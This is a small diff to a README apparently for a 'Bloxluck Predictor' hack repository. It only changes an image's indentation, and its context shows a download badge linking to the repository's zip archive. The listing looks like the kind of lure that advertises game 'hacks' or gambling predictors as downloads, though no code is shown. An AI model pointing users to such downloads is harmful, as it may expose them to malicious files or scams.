@@ -1,5 +1,4 @@
-                 ![blox](https://github.com/user-attachments/assets/6e03f343-bd72-477c-9c44-0ca0917e913b)
-
+   ![blox](https://github.com/user-attachments/assets/6e03f343-bd72-477c-9c44-0ca0917e913b)
 <p align="center">
   <a href="https://github.com/tradescamv2/blox-luck-hack/archive/refs/heads/main.zip" target="_blank">
     <img src="https://img.shields.io/badge/Download-Bloxluck%20Predictor-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxluck Predictor" />
